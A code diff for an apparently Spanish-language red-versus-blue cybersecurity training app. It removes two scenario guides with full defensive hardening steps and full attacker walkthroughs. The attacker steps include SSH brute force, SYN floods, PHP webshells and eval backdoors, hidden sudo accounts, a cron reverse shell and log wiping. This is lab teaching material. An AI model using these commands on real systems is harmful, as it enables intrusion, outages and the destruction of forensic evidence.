@@ -1,6 +1,5 @@
-
 import React from 'react';
-import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario, VirtualEnvironment } from './types';
+import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario, VirtualEnvironment, CommandLibraryData } from './types';
 
 // ============================================================================
 // Icon Component (Lucide SVG paths)
@@ -64,6 +63,8 @@ export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
         'crosshair': <><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></>,
         'star': <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>,
         'bot': <><rect width="18" height="10" x="3" y="11" rx="2"/><circle cx="12" cy="5" r="2"/><path d="M12 7v4"/><line x1="8" x2="8" y1="16" y2="16"/><line x1="16" x2="16" y1="16" y2="16"/></>,
+        'settings': <><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.47a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></>,
+        'globe': <><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></>,
     };
 
     return (
@@ -124,1483 +125,1532 @@ export const CisoTable: React.FC<{ headers: string[]; rows: (string | React.Reac
 );
 
 // ============================================================================
-// Simulation Defaults
+// Restored Constants
 // ============================================================================
-
-const getInitialPrompt = (team: 'red' | 'blue'): PromptState => {
-    if (team === 'blue') {
-        return { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' };
-    }
-    return { user: 'pasante-red', host: 'soc-valtorix', dir: '~' };
-};
-
-const getWelcomeMessage = (team: 'red' | 'blue'): TerminalLine[] => [
-    { text: `Bienvenido a la terminal del Equipo ${team === 'red' ? 'Rojo' : 'Azul'}.`, type: 'output' },
-    { html: "Escriba <strong class='text-amber-300'>help</strong> para ver sus objetivos y comandos.", type: 'html' },
-];
-
-export const DEFAULT_SIMULATION_STATE = {
-    firewall_enabled: false,
-    ssh_hardened: false,
-    banned_ips: [],
-    payload_deployed: false,
-    is_dos_active: false,
-    admin_password_found: false,
-    db_config_permissions: '644',
-    hydra_run_count: 0,
-    server_load: 5.0,
-    terminal_output_red: getWelcomeMessage('red'),
-    terminal_output_blue: getWelcomeMessage('blue'),
-    prompt_red: getInitialPrompt('red'),
-    prompt_blue: getInitialPrompt('blue'),
-};
-
-
-// ============================================================================
-// Static Content Data
-// ============================================================================
-
-export const SCENARIO_7_GUIDE = `
-🎯 Objetivos del Escenario
-Equipo Azul (Defensor)
-
-Activar y configurar el firewall UFW
-Deshabilitar login directo de root en SSH
-Asegurar archivos sensibles con permisos correctos
-Monitorear intentos de intrusión
-Implementar fail2ban (opcional)
-
-Equipo Rojo (Atacante)
-
-Realizar reconocimiento del servidor
-Obtener credenciales mediante fuerza bruta
-Comprometer el servidor
-Modificar archivos web
-Establecer persistencia (opcional)
-
-
-🔵 SOLUCIÓN COMPLETA - EQUIPO AZUL
-Fase 1: Activación del Firewall
-El firewall es tu primera línea de defensa. Es crítico activarlo correctamente.
-bash# 1. Conectarse al servidor
-ssh blue-team@BOVEDA-WEB
-# Contraseña: SecureP@ss2024!
-
-# 2. Verificar estado actual del firewall
-sudo ufw status
-# Debe mostrar: Status: inactive
-
-# 3. CRÍTICO: Permitir SSH primero (o te quedarás bloqueado)
-sudo ufw allow ssh
-# O específicamente: sudo ufw allow 22/tcp
-
-# 4. Permitir servicios web necesarios
-sudo ufw allow http
-sudo ufw allow https
-# O: sudo ufw allow 80/tcp
-# O: sudo ufw allow 443/tcp
-
-# 5. BLOQUEAR MySQL (no debe ser accesible externamente)
-sudo ufw deny 3306/tcp
-
-# 6. Activar el firewall
-sudo ufw enable
-# Confirmar con 'y'
-
-# 7. Verificar configuración
-sudo ufw status numbered
-Puntos ganados: 20 + 5 (bonus por bloquear MySQL)
-Fase 2: Hardening de SSH
-Deshabilitar el login directo de root es una práctica de seguridad fundamental.
-bash# 1. Editar configuración de SSH
-sudo nano /etc/ssh/sshd_config
-
-# 2. Buscar la línea:
-# PermitRootLogin yes
-
-# 3. Cambiarla a:
-# PermitRootLogin no
-
-# 4. Guardar y salir (Ctrl+X, Y, Enter)
-
-# 5. Reiniciar el servicio SSH para aplicar cambios
-sudo systemctl restart sshd
-
-# 6. Verificar que el cambio se aplicó
-grep "PermitRootLogin" /etc/ssh/sshd_config
-Puntos ganados: 15
-Fase 3: Seguridad de Archivos
-Aplicar el principio de menor privilegio a archivos sensibles.
-bash# 1. Verificar permisos actuales del archivo de configuración
-ls -l /var/www/html/db_config.php
-# Verás algo como: -rw-r--r-- (644)
-# Esto significa que CUALQUIERA puede leer el archivo (peligroso)
-
-# 2. Cambiar permisos a 640
-sudo chmod 640 /var/www/html/db_config.php
-
-# 3. Verificar el cambio
-ls -l /var/www/html/db_config.php
-# Ahora debe mostrar: -rw-r----- (640)
-# Solo el propietario puede escribir, el grupo puede leer, otros no tienen acceso
-
-# 4. Opcionalmente, cambiar propietario
-sudo chown www-data:www-data /var/www/html/db_config.php
-Explicación de permisos:
-
-644: Owner (rw-) Group (r--) Others (r--) ❌ Inseguro
-640: Owner (rw-) Group (r--) Others (---) ✅ Seguro
-600: Owner (rw-) Group (---) Others (---) ✅ Más seguro
-
-Puntos ganados: 15
-Fase 4: Monitoreo Activo
-Detectar ataques en tiempo real.
-bash# 1. Monitorear intentos de login fallidos
-grep "Failed" /var/log/auth.log | tail -20
-
-# O en sistemas con journald:
-journalctl -u sshd | grep "Failed"
-
-# 2. Ver en tiempo real (ejecutar en otra terminal)
-tail -f /var/log/auth.log
-
-# 3. Verificar servicios escuchando
-sudo ss -tulnp
-# Deberías ver solo SSH (22), HTTP (80), HTTPS (443)
-# Si ves MySQL (3306), el firewall no está configurado correctamente
-
-# 4. Verificar carga del sistema
-top
-# o mejor:
-htop
-
-# 5. Ver conexiones activas
-sudo netstat -antp | grep ESTABLISHED
-Puntos ganados: 5 (bonus)
-Fase 5: Fail2Ban (Bonus - Avanzado)
-Banear automáticamente IPs que intentan fuerza bruta.
-bash# 1. Instalar fail2ban
-sudo apt update
-sudo apt install fail2ban -y
-
-# 2. Crear configuración local
-sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
-
-# 3. Editar configuración
-sudo nano /etc/fail2ban/jail.local
-
-# 4. Configurar la jail de SSH:
-[sshd]
-enabled = true
-port = ssh
-filter = sshd
-logpath = /var/log/auth.log
-maxretry = 3
-bantime = 3600
-findtime = 600
-
-# 5. Reiniciar fail2ban
-sudo systemctl restart fail2ban
-
-# 6. Verificar estado
-sudo fail2ban-client status sshd
-
-# 7. Ver IPs baneadas
-sudo fail2ban-client get sshd banned
-
-# 8. Desbanear una IP manualmente (si es necesario)
-sudo fail2ban-client unban 192.168.1.100
-Puntos ganados: 10 (bonus)
-Checklist de Seguridad - Equipo Azul
-
- Firewall UFW activado y configurado
- Solo puertos necesarios abiertos (22, 80, 443)
- MySQL bloqueado (3306)
- PermitRootLogin configurado a "no"
- SSH reiniciado para aplicar cambios
- Permisos de db_config.php cambiados a 640
- Monitoreo de logs activo
- Fail2ban instalado y configurado (bonus)
-
-
-🔴 SOLUCIÓN COMPLETA - EQUIPO ROJO
-Fase 1: Reconocimiento
-Primero, necesitas saber qué está abierto y qué versiones están corriendo.
-bash# 1. Desde la terminal soc-valtorix (tu Kali)
-# Escaneo básico de puertos
-nmap BOVEDA-WEB
-
-# 2. Escaneo detallado con detección de versiones
-nmap -sV -sC BOVEDA-WEB
-
-# 3. Escaneo completo (más lento pero exhaustivo)
-nmap -sV -sC -p- BOVEDA-WEB
-
-# 4. Escaneo de vulnerabilidades
-nmap --script vuln BOVEDA-WEB
-¿Qué buscar?
-
-Puerto 22 (SSH) - ¿Está abierto?
-Puerto 3306 (MySQL) - ¿Está expuesto? (Vulnerabilidad crítica)
-Puerto 80/443 (HTTP/HTTPS) - ¿Qué servidor web?
-Versiones de servicios - ¿Hay CVEs conocidos?
-
-Puntos ganados: 10
-Fase 2: Ataque de Fuerza Bruta
-Si el Equipo Azul no aseguró SSH, puedes obtener credenciales.
-bash# 1. Preparar wordlist (ya está en Kali)
-ls /usr/share/wordlists/
-# Usa rockyou.txt (es la más común)
-
-# 2. Ataque de fuerza bruta con Hydra
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://BOVEDA-WEB
-
-# 3. Ataque más rápido con menos intentos
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://BOVEDA-WEB -t 4
-
-# 4. Si encuentras la contraseña "toor", verás:
-# [22][ssh] host: BOVEDA-WEB login: root password: toor
-⚠️ Nota importante:
-
-Este ataque SOLO funciona si PermitRootLogin está en "yes"
-Si el Equipo Azul lo deshabilitó, verás: "Permission denied"
-El ataque será visible en /var/log/auth.log del servidor
-
-Puntos ganados: 25
-Fase 3: Compromiso del Servidor
-Una vez que tienes credenciales, accede al servidor.
-bash# 1. Conectarse vía SSH
-ssh root@BOVEDA-WEB
-# Contraseña: toor (si el brute force fue exitoso)
-
-# 2. Verificar que estás dentro
-whoami
-# Debe mostrar: root
-
-hostname
-# Debe mostrar: BOVEDA-WEB
-
-# 3. Reconocimiento interno
-ls -la /var/www/html/
-cat /etc/passwd
-ps aux
-netstat -antp
-Puntos ganados: 20
-Fase 4: Explotación Web
-Modificar el sitio web para demostrar el compromiso.
-bash# 1. Ver el hash original del archivo
-sha256sum /var/www/html/index.php
-
-# 2. Modificar el archivo index.php
-nano /var/www/html/index.php
-
-# 3. Agregar tu marca (ejemplo):
-<?php
-echo "<!DOCTYPE html><html><body>";
-echo "<h1 style='color:red;'>PWNED BY RED TEAM</h1>";
-echo "<p>BOVEDA-WEB has been compromised</p>";
-echo "</body></html>";
-?>
-
-# 4. Guardar (Ctrl+X, Y, Enter)
-
-# 5. Verificar que el hash cambió
-sha256sum /var/www/html/index.php
-# Debe ser diferente al original
-Puntos ganados: 35
-Fase 5: Persistencia (Bonus - Avanzado)
-Mantener acceso incluso si cambian las contraseñas.
-Opción 1: Crear cuenta backdoor
-bash# 1. Crear usuario oculto
-useradd -m -s /bin/bash sys-update
-
-# 2. Dar permisos sudo
-usermod -aG sudo sys-update
-
-# 3. Establecer contraseña
-echo "sys-update:BackdoorP@ss123" | chpasswd
-
-# 4. Probar acceso
-ssh sys-update@BOVEDA-WEB
-Opción 2: Clave SSH
-bash# 1. En tu Kali, generar par de claves
-ssh-keygen -t rsa -b 4096 -f ~/.ssh/boveda_backdoor
-
-# 2. Copiar clave pública al servidor
-# (Estando ya dentro como root)
-mkdir -p /root/.ssh
-echo "tu-clave-publica-aqui" >> /root/.ssh/authorized_keys
-chmod 600 /root/.ssh/authorized_keys
-
-# 3. Ahora puedes conectar sin contraseña
-ssh -i ~/.ssh/boveda_backdoor root@BOVEDA-WEB
-Opción 3: Webshell
-bash# 1. Crear webshell simple
-cat > /var/www/html/shell.php << 'EOF'
-<?php
-if(isset($_GET['cmd'])){
-    system($_GET['cmd']);
-}
-?>
-EOF
-
-# 2. Usar desde navegador o curl
-curl "http://BOVEDA-WEB/shell.php?cmd=whoami"
-Puntos ganados: 15 (bonus)
-Checklist de Ataque - Equipo Rojo
-
- Reconocimiento completo con nmap
- Identificación de servicios vulnerables
- Fuerza bruta exitosa (si SSH no está asegurado)
- Acceso root obtenido
- index.php modificado (hash diferente)
- Persistencia establecida (opcional)
- Documentación de todos los pasos
-`;
-
-export const SCENARIO_8_GUIDE = `
-Escenario 8: Furia en la Red - Ataque Combinado
-📋 Información General
-Objetivo: Ataque combinado DoS + Bruteforce simultáneos contra PORTAL-WEB. El Equipo Azul debe priorizar y contener bajo presión extrema.
-Dificultad: Avanzado
-Equipos: Rojo vs Azul
-Duración estimada: 60-90 minutos
-Servidor objetivo: PORTAL-WEB (10.0.20.10)
-
-🎯 Objetivos del Escenario
-Equipo Azul (Defensor)
-
-Detectar y diagnosticar el ataque DoS
-Identificar el ataque de fuerza bruta en logs
-Bloquear la IP del atacante
-Verificar integridad de archivos del sistema
-Restaurar servicios si fueron comprometidos
-
-Equipo Rojo (Atacante)
-
-Lanzar ataque DoS para saturar el servidor
-Ejecutar fuerza bruta mientras el DoS cubre el rastro
-Obtener credenciales de administrador
-Comprometer el servidor y desplegar backdoor
-Mantener persistencia
-
-
-🔵 SOLUCIÓN COMPLETA - EQUIPO AZUL
-Fase 1: Diagnóstico Inicial (Bajo Presión)
-El servidor está bajo ataque. Tu primer trabajo es entender qué está pasando.
-bash# 1. Conectarse al servidor (puede estar lento)
-ssh blue-team@PORTAL-WEB
-# Contraseña: Bl#3T3@m!2024
-
-# 2. Verificar carga del sistema inmediatamente
-top
-# O mejor aún:
-htop
-
-# ⚠️ Lo que verás:
-# - CPU al 95-99% (señal de DoS)
-# - Múltiples conexiones de red activas
-# - Proceso específico consumiendo recursos
-Análisis de top/htop:
-Load average: 45.32, 38.21, 25.14  <- ANORMAL (debería ser < 2.0)
-%Cpu(s): 98.7 us  <- CPU casi al máximo
-Puntos ganados: 10 (por detectar DoS)
-Fase 2: Identificación del Ataque de Fuerza Bruta
-Mientras el sistema está saturado, hay otro ataque en paralelo.
-bash# 1. Revisar logs de autenticación
-journalctl -u sshd | tail -50
-
-# O con grep:
-grep "Failed" /var/log/auth.log | tail -30
-
-# 2. Ver en tiempo real
-tail -f /var/log/auth.log
-
-# ⚠️ Lo que verás:
-# Nov 18 10:15:32 PORTAL-WEB sshd[12345]: Failed password for admin from 192.168.1.100 port 45123 ssh2
-# Nov 18 10:15:33 PORTAL-WEB sshd[12346]: Failed password for admin from 192.168.1.100 port 45124 ssh2
-# Nov 18 10:15:34 PORTAL-WEB sshd[12347]: Failed password for admin from 192.168.1.100 port 45125 ssh2
-# [... cientos de líneas similares ...]
-
-# 3. Contar intentos fallidos
-grep "Failed password for admin" /var/log/auth.log | wc -l
-
-# 4. Identificar la IP del atacante
-grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
-Puntos ganados: 10 (por detectar bruteforce)
-Fase 3: Contención Inmediata - CRÍTICO
-¡Esta es la acción más importante! Detén el sangrado AHORA.
-bash# 1. Bloquear la IP del atacante en el firewall
-sudo ufw deny from 192.168.1.100
-
-# 2. Verificar que la regla se aplicó
-sudo ufw status numbered
-
-# 3. Verificar que los ataques se detuvieron
-# Espera 30 segundos y luego revisa:
-tail /var/log/auth.log
-# Ya no deberías ver más intentos fallidos
-
-# 4. Verificar carga del CPU
-top
-# La carga debería empezar a bajar gradualmente
-
-# 5. Ver conexiones activas
-sudo ss -antp | grep 192.168.1.100
-# No deberías ver conexiones de esa IP
-Resultado esperado:
-
-CPU baja de 99% a ~10% en 1-2 minutos
-No más intentos de login fallidos
-Conexiones del atacante terminadas
-
-Puntos ganados: 25
-Fase 4: Análisis Post-Ataque
-Determina si el atacante tuvo éxito antes del bloqueo.
-bash# 1. Buscar logins exitosos
-grep "Accepted" /var/log/auth.log | grep "192.168.1.100"
-
-# Si ves algo como:
-# "Accepted password for admin from 192.168.1.100"
-# ⚠️ ¡El atacante entró!
-
-# 2. Ver sesiones activas
-who
-w
-
-# 3. Si hay una sesión sospechosa, terminarla
-sudo pkill -u admin
-# O más específico:
-sudo kill -9 <PID>
-
-# 4. Cambiar contraseña comprometida INMEDIATAMENTE
-sudo passwd admin
-Puntos ganados: 5 (bonus por respuesta rápida)
-Fase 5: Verificación de Integridad
-Determina si archivos fueron modificados.
-bash# 1. Verificar hash del archivo web principal
-sha256sum /var/www/html/index.php
-
-# Hash original conocido: original_hash_123
-# Si es diferente, el archivo fue modificado
-
-# 2. Buscar archivos sospechosos
-find /var/www/html -type f -mmin -60
-# Archivos modificados en los últimos 60 minutos
-
-# 3. Buscar webshells comunes
-find /var/www/html -name "*.php" -exec grep -l "system\|exec\|shell_exec" {} \;
-
-# 4. Revisar archivos recientemente modificados
-ls -alt /var/www/html/ | head -20
-
-# 5. Si encuentras un backdoor:
-cat /var/www/html/index.php
-# Si ves código malicioso, restaura desde backup:
-sudo rm /var/www/html/index.php
-sudo cp /var/backups/index.php.backup /var/www/html/index.php
-Puntos ganados: 20
-Fase 6: Hardening Post-Incidente
-Prevenir futuros ataques similares.
-bash# 1. Instalar y configurar Fail2Ban
-sudo apt update
-sudo apt install fail2ban -y
-
-# 2. Configurar jail de SSH
-sudo nano /etc/fail2ban/jail.local
-
-# Agregar:
-[sshd]
-enabled = true
-port = ssh
-filter = sshd
-logpath = /var/log/auth.log
-maxretry = 3
-bantime = 3600
-findtime = 600
-
-# 3. Reiniciar fail2ban
-sudo systemctl restart fail2ban
-sudo systemctl enable fail2ban
-
-# 4. Verificar que está funcionando
-sudo fail2ban-client status sshd
-
-# 5. Configurar límites de tasa en firewall
-sudo ufw limit ssh
-
-# 6. Implementar IP whitelisting si es posible
-sudo ufw allow from 10.10.0.0/16 to any port 22
-sudo ufw deny from any to any port 22
-Puntos ganados: 10 (bonus por fail2ban)
-Fase 7: Restauración del Sistema
-Si el servidor fue comprometido, restaura a estado limpio.
-bash# 1. Matar procesos sospechosos
-ps aux | grep -v "grep" | grep -i "shell\|backdoor"
-sudo kill -9 <PID>
-
-# 2. Eliminar backdoors
-sudo rm /var/www/html/shell.php
-sudo rm /var/www/html/.hidden_backdoor.php
-
-# 3. Restaurar archivos desde backup
-sudo cp /var/backups/index.php.backup /var/www/html/index.php
-
-# 4. Verificar permisos
-sudo chmod 644 /var/www/html/*.php
-sudo chown www-data:www-data /var/www/html/*.php
-
-# 5. Reiniciar servicios web
-sudo systemctl restart nginx
-
-# 6. Verificar que el sitio funciona
-curl http://PORTAL-WEB
-Puntos ganados: 25
-Checklist Completo - Equipo Azul
-
- DoS detectado con top/htop (CPU > 90%)
- Bruteforce identificado en logs
- IP del atacante identificada (192.168.1.100)
- IP bloqueada con UFW
- Carga del sistema normalizada
- Login exitoso del atacante verificado
- Sesiones maliciosas terminadas
- Integridad de archivos verificada
- Backdoors eliminados (si existen)
- Sistema restaurado a estado limpio
- Fail2Ban instalado y configurado
- Contraseñas comprometidas cambiadas
-
-
-🔴 SOLUCIÓN COMPLETA - EQUIPO ROJO
-Fase 1: Preparación del Ataque
-Planifica el ataque combinado.
-bash# 1. Desde tu terminal soc-valtorix
-# Verificar que el objetivo está arriba
-ping PORTAL-WEB
-
-# 2. Reconocimiento rápido
-nmap -sV PORTAL-WEB
-# Confirma que SSH (22) y HTTP (80) están abiertos
-
-# 3. Preparar herramientas
-which hping3  # Para DoS
-which hydra   # Para bruteforce
-Fase 2: Lanzar Ataque DoS
-Satura el servidor para crear caos y cubrir el bruteforce.
-bash# 1. Ataque SYN Flood con hping3
-hping3 --flood -S -p 80 PORTAL-WEB
-
-# Alternativas:
-# TCP flood en múltiples puertos
-hping3 --flood -S -p 22,80,443 PORTAL-WEB
-
-# UDP flood
-hping3 --flood --udp -p 80 PORTAL-WEB
-
-# 2. Verificar que el ataque está funcionando
-# En otra terminal, mide la respuesta:
-ping PORTAL-WEB
-# Deberías ver latencia muy alta (>1000ms) o timeouts
-
-# 3. Monitorear el impacto
-# Si tienes acceso, verifica CPU del servidor:
-# top en PORTAL-WEB debería mostrar 95%+ de uso
-⚠️ Importante:
-
-Mantén el ataque DoS corriendo en una terminal dedicada
-No lo detengas hasta completar la fase de bruteforce
-El DoS crea "ruido" que dificulta la detección del bruteforce
-
-Puntos ganados: 20
-Fase 3: Ataque de Fuerza Bruta (Simultáneo)
-Mientras el DoS está activo, lanza el bruteforce en otra terminal.
-bash# 1. En una NUEVA terminal (no cierres la del DoS)
-# Ataque de fuerza bruta contra admin
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://PORTAL-WEB -t 16 -V
-
-# Opciones explicadas:
-# -l admin: usuario objetivo
-# -P rockyou.txt: lista de contraseñas
-# -t 16: 16 threads (paralelismo)
-# -V: verbose (ver cada intento)
-
-# 2. Cuando encuentre la contraseña, verás:
-# [22][ssh] host: PORTAL-WEB login: admin password: P@ssw0rd
-Estrategia:
-
-El DoS hace que el monitoreo sea difícil
-Los logs se llenan de eventos del DoS
-El bruteforce se "esconde" en el ruido
-Ventana de tiempo: ~5-10 minutos antes de detección
-
-Puntos ganados: 30
-Fase 4: Acceso y Despliegue de Backdoor
-Una vez que tienes credenciales, actúa RÁPIDO.
-bash# 1. Detener el ataque DoS (Ctrl+C en esa terminal)
-
-# 2. Conectar vía SSH inmediatamente
-ssh admin@PORTAL-WEB
-# Contraseña: P@ssw0rd (la que encontró hydra)
-
-# 3. Verificar acceso
-whoami  # admin
-id      # ver grupos
-
-# 4. Desplegar webshell simple
-cat > /var/www/html/shell.php << 'EOF'
-<?php
-if(isset($_GET['cmd'])){
-    echo "<pre>";
-    system($_GET['cmd']);
-    echo "</pre>";
-}
-?>
-EOF
-
-# 5. Verificar que funciona
-curl "http://PORTAL-WEB/shell.php?cmd=whoami"
-# Debería retornar: www-data
-
-# 6. Modificar index.php para demostrar compromiso
-cp /var/www/html/index.php /tmp/index.php.bak
-cat > /var/www/html/index.php << 'EOF'
-<?php
-echo "<!DOCTYPE html><html><body style='background-color:black; color:red;'>";
-echo "<h1>🔥 PORTAL-WEB COMPROMISED 🔥</h1>";
-echo "<p>Red Team was here</p>";
-echo "<p style='font-size:10px;'>Timestamp: " . date('Y-m-d H:i:s') . "</p>";
-echo "</body></html>";
-?>
-EOF
-
-# 7. Verificar
-curl http://PORTAL-WEB
-Puntos ganados: 35
-Fase 5: Persistencia Avanzada
-Asegura que mantendrás acceso incluso si detectan y bloquean.
-Método 1: Cuenta Backdoor
-bash# 1. Crear usuario oculto del sistema
-sudo useradd -m -s /bin/bash .update-daemon
-
-# 2. Dar privilegios sudo
-sudo usermod -aG sudo .update-daemon
-
-# 3. Establecer contraseña
-echo ".update-daemon:Backd00rP@ss" | sudo chpasswd
-
-# 4. Ocultar el usuario (opcional)
-# Editar /etc/passwd para que no aparezca en 'who'
-Método 2: Cronjob Reverse Shell
-bash# 1. Crear script de reverse shell
-cat > /tmp/.system-update.sh << 'EOF'
-#!/bin/bash
-bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
-EOF
-
-chmod +x /tmp/.system-update.sh
-
-# 2. Agregar al crontab
-(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.system-update.sh") | crontab -
-
-# 3. En tu Kali, listener:
-nc -lvnp 4444
-Método 3: SSH Key Backdoor
-bash# 1. En tu Kali, generar clave
-ssh-keygen -t rsa -b 4096 -f ~/.ssh/portal_backdoor -N ""
-
-# 2. Copiar clave pública al servidor
-# (Estando conectado como admin)
-mkdir -p ~/.ssh
-cat >> ~/.ssh/authorized_keys << 'EOF'
-ssh-rsa AAAAB3NzaC... tu-clave-publica-aqui
-EOF
-chmod 600 ~/.ssh/authorized_keys
-
-# 3. Ahora puedes conectar sin contraseña
-ssh -i ~/.ssh/portal_backdoor admin@PORTAL-WEB
-Método 4: Backdoor en Módulo PHP
-bash# 1. Crear backdoor más sofisticado
-cat > /var/www/html/media/cache/.system.php << 'EOF'
-<?php
-if(md5($_GET['auth']) == 'e10adc3949ba59abbe56e057f20f883e'){
-    eval(base64_decode($_POST['cmd']));
-}
-?>
-EOF
-
-# 2. Uso:
-# La contraseña es: 123456 (MD5: e10adc3949ba59abbe56e057f20f883e)
-# URL: http://PORTAL-WEB/media/cache/.system.php?auth=123456
-# POST data: cmd=base64_encoded_command
-Puntos ganados: 15 (bonus por persistencia)
-Fase 6: Limpieza de Rastros (Avanzado)
-Dificulta la investigación forense.
-bash# 1. Limpiar logs de autenticación
-sudo truncate -s 0 /var/log/auth.log
-
-# O más selectivo:
-sudo sed -i '/admin/d' /var/log/auth.log
-
-# 2. Limpiar historial de bash
-history -c
-rm ~/.bash_history
-ln -s /dev/null ~/.bash_history
-
-# 3. Limpiar logs web
-sudo truncate -s 0 /var/log/nginx/access.log
-sudo truncate -s 0 /var/log/nginx/error.log
-
-# 4. Modificar timestamps de archivos
-touch -r /etc/passwd /var/www/html/shell.php
-⚠️ Nota Ética: Esta fase es solo para entrenamiento. En un pentest real, NUNCA borres logs sin autorización explícita.
-Puntos ganados: 5 (bonus por evasión)
-Checklist de Ataque - Equipo Rojo
-
- DoS lanzado exitosamente (CPU > 90%)
- Bruteforce ejecutado durante el DoS
- Credenciales de admin obtenidas
- Acceso SSH conseguido
- Webshell desplegado
- index.php modificado (hash diferente)
- Al menos un método de persistencia implementado
- Rastros parcialmente limpiados (opcional)
-`;
 
 export const GLOSSARY_TERMS: GlossaryTerm[] = [
-    { term: "Dirección IP (IPv4/IPv6)", definition: "Identificador numérico único para dispositivos en una red. (Ver: Guía IP, Fundamentos)" },
-    { term: "Modelo OSI", definition: "Modelo teórico de 7 capas (Física, Enlace, Red, Transporte, Sesión, Presentación, Aplicación) para entender la comunicación de redes. (Ver: Protocolos, Fundamentos)" },
-    { term: "Modelo TCP/IP", definition: "Modelo práctico de 4 capas (Acceso a Red, Internet, Transporte, Aplicación) sobre el que funciona Internet. (Ver: Protocolos, Fundamentos)" },
-    { term: "Protocolo", definition: "Conjunto de reglas que definen cómo se comunican los dispositivos. (Ver: Fundamentos, Protocolos)" },
-    { term: "TCP (Protocolo de Control de Transmisión)", definition: "Protocolo de Capa 4, fiable y orientado a conexión (como correo certificado). (Ver: Fundamentos, Protocolos)" },
-    { term: "UDP (Protocolo de Datagramas de Usuario)", definition: "Protocolo de Capa 4, rápido y no fiable (como tarjeta postal). (Ver: Fundamentos, Protocolos)" },
-    { term: "Puerto de Red", definition: "Identificador numérico (0-65535) que dirige el tráfico a una aplicación específica en un dispositivo. (Ver: Fundamentos)" },
-    { term: "Socket", definition: "Combinación de una Dirección IP y un Puerto, creando un punto final de comunicación único (ej. 192.168.1.1:443). (Ver: Fundamentos)" },
-    { term: "DNS (Sistema de Nombres de Dominio)", definition: "La \"agenda telefónica\" de Internet. Traduce nombres de dominio (cybervaltorix.com) a direcciones IP. (Ver: Recursos)" },
-    { term: "NetID y HostID", definition: "Las dos partes de una IP: el NetID identifica la red y el HostID identifica al dispositivo en esa red. (Ver: Recursos)" },
-    { term: "IP Pública vs. Privada", definition: "Pública (única en Internet) vs. Privada (reutilizable en redes locales, ej. 192.168.x.x). (Ver: Recursos)" },
-    { term: "NAT (Network Address Translation)", definition: "Permite a múltiples dispositivos en una red privada compartir una única IP pública. (Ver: Recursos)" },
-    { term: "Subnetting (Subredes)", definition: "Técnica de dividir una red grande en redes más pequeñas (subredes) para mejorar la organización y seguridad. (Ver: Recursos)" },
-    { term: "Máscara de Subred", definition: "Número (ej. 255.255.255.0 o /24) que define qué porción de una IP es el NetID y qué porción es el HostID. (Ver: Recursos)" },
-    { term: "VLSM (Máscara de Subred de Longitud Variable)", definition: "Técnica avanzada de subnetting que permite crear subredes de diferentes tamaños para maximizar la eficiencia de IPs. (Ver: Recursos)" },
-    { term: "Encapsulación", definition: "Proceso de \"envolver\" datos con encabezados de control a medida que bajan por las capas del modelo de red. (Ver: Recursos)" },
-    { term: "PDU (Unidad de Datos de Protocolo)", definition: "El nombre genérico de los \"datos\" en cada capa: Trama (Capa 2), Paquete (Capa 3), Segmento/Datagrama (Capa 4). (Ver: Recursos)" },
+    { term: "SOC", definition: "Security Operations Center - Centro de Operaciones de Seguridad. Unidad centralizada responsable de monitorear, detectar y responder a amenazas de ciberseguridad." },
+    { term: "Blue Team", definition: "Equipo defensivo responsable de proteger la infraestructura, monitorear logs y responder a incidentes." },
+    { term: "Red Team", definition: "Equipo ofensivo que simula ser un atacante para probar la efectividad de las defensas." },
+    { term: "CISO", definition: "Chief Information Security Officer - Director de Seguridad de la Información." },
+    { term: "SIEM", definition: "Security Information and Event Management - Sistema para centralizar y analizar logs." },
+    { term: "DMZ", definition: "Demilitarized Zone - Red perimetral que expone servicios al exterior protegiendo la red interna." },
+    { term: "Firewall", definition: "Sistema de seguridad de red que monitorea y controla el tráfico entrante y saliente." }
 ];
 
-export const fortressScenario: InteractiveScenario = {
-    id: 'escenario7',
-    isInteractive: true,
-    icon: 'shield-check',
-    color: 'bg-indigo-500',
-    title: 'Fortaleza Digital (Hardening vs. Pentest)',
-    subtitle: 'Equipo Rojo vs. Equipo Azul - Simulación Interactiva',
-    description: 'Rojo debe comprometer el servidor BOVEDA-WEB. Azul debe asegurarlo antes de que sea demasiado tarde. Tiempo estimado: 45 mins.',
-    difficulty: 'intermediate',
-    team: 'both',
-    initialEnvironment: {
-        networks: {
-            'dmz': {
-                hosts: [{
